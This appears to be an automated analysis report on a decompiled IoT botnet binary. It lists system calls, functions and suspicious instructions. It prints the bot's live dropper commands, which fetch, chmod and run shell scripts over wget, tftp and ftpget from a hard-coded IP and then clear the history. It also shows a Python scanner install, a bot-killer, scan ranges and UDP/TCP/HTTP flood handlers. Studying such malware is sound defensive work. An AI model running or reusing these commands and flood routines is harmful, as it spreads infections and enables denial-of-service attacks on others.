        szprintf((int32_t)&v221, (int32_t)"103.30.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.33.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"123.16.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"202.44.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"116.93.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"91.83.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"41.253.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"117.173.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"113.190.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"146.88.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"112.196.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"113.178.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"112.45.%d.%d", (int32_t)v218);

        szprintf(v222, (int32_t)"183.223.%d.%d", (int32_t)v218);

    szprintf(v223, (int32_t)"%d.%d.%d.%d", (int32_t)v224);

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v220);

            __libc_system(v220);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"killall -9 python;pkill python"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3"));

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |6381    |626           |823         |
----------------------------------------------------------------------------------------------
_init                                             |0   |1019    |157           |0           |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |917     |121           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |858     |87            |485         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |1096    |70            |175         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |985     |65            |628         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |4   |3991    |55            |3683        |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |533     |38            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |475     |33            |130         |
----------------------------------------------------------------------------------------------
prints                                            |4   |656     |30            |33          |
----------------------------------------------------------------------------------------------
sendUDP                                           |7   |430     |26            |97          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |680     |25            |271         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |2   |1070    |19            |822         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |365     |17            |107         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |526     |14            |0           |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |445     |13            |198         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |2   |805     |13            |0           |
----------------------------------------------------------------------------------------------
print                                             |3   |560     |11            |315         |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |420     |11            |157         |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |353     |10            |12          |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |289     |9             |65          |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |626     |9             |269         |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |598     |9             |216         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |6   |479     |9             |18          |
----------------------------------------------------------------------------------------------
printi                                            |7   |333     |8             |18          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |290     |8             |50          |
----------------------------------------------------------------------------------------------
negotiate                                         |4   |274     |7             |0           |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |247     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |258     |7             |23          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |357     |7             |106         |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |273     |6             |23          |
----------------------------------------------------------------------------------------------
NetisScanner                                      |1   |234     |6             |9           |
----------------------------------------------------------------------------------------------
getCores                                          |0   |246     |6             |21          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |0   |230     |6             |0           |
----------------------------------------------------------------------------------------------
UpdateBins                                        |1   |234     |6             |0           |
----------------------------------------------------------------------------------------------
readUntil                                         |7   |333     |5             |99          |
----------------------------------------------------------------------------------------------
strstr                                            |3   |357     |5             |115         |
----------------------------------------------------------------------------------------------
srandom_r                                         |0   |310     |5             |41          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |2   |345     |5             |62          |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |345     |4             |89          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |257     |4             |0           |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |0   |935     |4             |689         |
----------------------------------------------------------------------------------------------
connectTimeout                                    |5   |289     |4             |31          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |391     |4             |0           |
----------------------------------------------------------------------------------------------
realloc                                           |1   |289     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |252     |3             |20          |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |1   |494     |3             |269         |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |330     |3             |82          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |325     |3             |67          |
----------------------------------------------------------------------------------------------
sockprintf                                        |3   |229     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |315     |3             |62          |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |269     |3             |0           |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |242     |3             |18          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |1   |224     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |259     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |3   |266     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |259     |2             |30          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |339     |2             |52          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |264     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |284     |2             |60          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |252     |2             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |291     |2             |54          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |2   |273     |2             |30          |
----------------------------------------------------------------------------------------------
inet_aton                                         |1   |310     |2             |73          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |286     |2             |28          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |245     |2             |17          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |231     |2             |0           |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |291     |2             |61          |
----------------------------------------------------------------------------------------------
__GI_strlen                                       |0   |306     |2             |24          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |255     |2             |17          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |331     |2             |27          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |345     |2             |84          |
----------------------------------------------------------------------------------------------
abort                                             |1   |340     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |322     |2             |69          |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |2   |319     |2             |85          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |222     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |2   |222     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |3   |223     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |229     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |410     |1             |115         |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |262     |1             |36          |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |287     |1             |46          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |6   |224     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |2   |222     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |7   |221     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |291     |1             |61          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |237     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |313     |1             |4           |
----------------------------------------------------------------------------------------------
rand                                              |0   |222     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |244     |1             |17          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |303     |1             |52          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |249     |1             |18          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |233     |1             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |413     |1             |91          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |223     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |248     |1             |17          |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |297     |1             |0           |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |275     |1             |45          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |2   |320     |1             |66          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |249     |1             |17          |
----------------------------------------------------------------------------------------------
sprintf                                           |8   |224     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |3   |227     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |224     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |222     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |0   |327     |1             |37          |
----------------------------------------------------------------------------------------------
zprintf                                           |2   |222     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |221     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |227     |1             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |252     |1             |28          |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |236     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |223     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |222     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |229     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |224     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |0   |305     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |244     |1             |20          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |257     |1             |26          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |221     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |225     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |229     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |222     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |236     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |269     |1             |35          |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |4   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |222     |1             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |3   |305     |1             |10          |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |232     |1             |9           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |247     |1             |21          |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |229     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |221     |1             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |276     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |273     |1             |44          |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |233     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |239     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |3   |222     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |2   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |233     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |2   |222     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |485     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |235     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |4   |228     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |258     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |7   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcsetattr                                    |0   |351     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |226     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |285     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |1   |237     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |274     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |0   |236     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |6   |230     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |238     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |0   |393     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |282     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |3   |302     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |222     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |241     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |1   |226     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |275     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |1   |244     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |231     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |246     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |226     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |4   |222     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |254     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |242     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |2   |365     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |3   |237     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |380     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |1   |246     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |235     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |2   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |4   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |253     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |301     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |5   |373     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |239     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |241     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |257     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |506     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |238     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |228     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |237     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |1   |235     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |239     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |2   |222     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |2   |223     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |2   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |0   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |232     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |2   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |224     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |6   |232     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |2   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |3   |257     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |2   |293     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |234     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |1   |222     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |242     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |248     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |235     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |3   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |239     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |226     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |3   |286     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |225     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |229     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |2   |264     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 18298
++++++++ FUNCTION END 24679
++++++++ FUNCTION LENGTH 6381
            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));
            sockprintf(v212, (int32_t)"INSTALLING PYTHON SCANNER", 0x10020000);
            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));
            sockprintf(v212, (int32_t)"UPDATING PYTHON SCANNER", 0x10020000);
            ClearHistory(__libc_system((int32_t)"killall -9 python;pkill python"));
            sockprintf(v212, (int32_t)"STOPPING PYTHON SCANNER", 0x10020000);
            ClearHistory(__libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3"));
            sockprintf(v212, (int32_t)"STARTING VOIDS HACKA SCANNA", 0x10020000);
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v212, (int32_t)"PONG!", 0x10020000);
            int32_t v215 = getdtablesize((int32_t)&v214); // 0x10008788
            sockprintf(v212, (int32_t)"%d", v215);
                sockprintf(v212, (int32_t)"UPDATE TAKEN SUCCESFULLY", 0x10020000);
                        kill(v289, 9);
                        sockprintf(v212, (int32_t)"STOPPING SCANNER", 0x10020000);
                            int32_t v290 = __libc_fork(); // 0x100088cc
                                int32_t v291 = __GI_inet_ntoa(&v224, (int32_t)&v214); // 0x10008930
                                sockprintf(v223, (int32_t)"STARTING SCANNER ON -> %s", v291);
                                if (__GI_strcoll((char *)*a2, (int32_t)"NETIS") == 0) {
                                        kill(v278, 9);
                                        v279 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                        sockprintf(v223, (int32_t)"STOPPING NETIS SCANNER", v279);
                                            v232 = __libc_fork();
                                                v280 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                                v286 = sockprintf(v223, (int32_t)"STARTING NETIS SCANNER", v280);
                                                NetisScanner(v286);
                                                    if (listFork() == 0) {
                                                        v281 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                                        v287 = sockprintf(v223, (int32_t)"COMMENCING BOT KILL ON -> %s", v281);
                                                        botkiller(v287);
                                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                                    v282 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                                    sockprintf(v223, (int32_t)"My Public IP: %s", v282);
                                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                                return sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                                        result = sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                                        result = sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendTCP(v227, v266, v267, v268, v269, v229, v230);
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                                int32_t result2 = listFork(); // 0x1000937c
                                                                                                                                                sendHTTP(*v248, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                                                        v314 = listFork();
                                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                        result3 = sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                                                int32_t result4 = listFork(); // 0x100095a0
                                                                                                                                                                sendCNC(v297, v298, v299);
                                                                                                                                                                                    v314 = listFork();
                                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                            sockprintf(v212, (int32_t)"None Killed.", 0x10020000);
                                                                                                                                                                                                            sockprintf(v212, (int32_t)"Killed %d.", v312);
                                                                                                                                                                                                    if (*v317 != __libc_getpid()) {
